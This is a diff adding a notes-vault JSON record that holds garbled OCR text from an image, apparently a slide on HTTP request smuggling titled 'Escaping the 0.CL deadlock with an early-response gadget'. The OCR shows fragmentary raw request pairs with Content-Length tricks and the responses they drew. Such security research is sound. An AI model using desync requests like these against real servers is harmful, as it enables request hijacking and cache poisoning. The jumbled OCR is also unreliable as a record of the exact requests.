@@ -1,0 +1,1 @@
+{"path":"Clippings/attachments/Pasted image 20250811163423.png","text":"Escaping the 0.CL deadlock with an early-response gadget GET /[&f) HTTP/1.1 GET /con HTTP/1.1 Host: <redacted> Host: <redacted> Content-Length: Content-Length: 7 7, HTTP/1.1 200 OK GET / HTTP/1.1 GET / HTTP/1.1 Host: <redacted> Host: <redacted> HTTP/1.1 400 Bad Request","libVersion":"0.5.0","langs":"eng"}
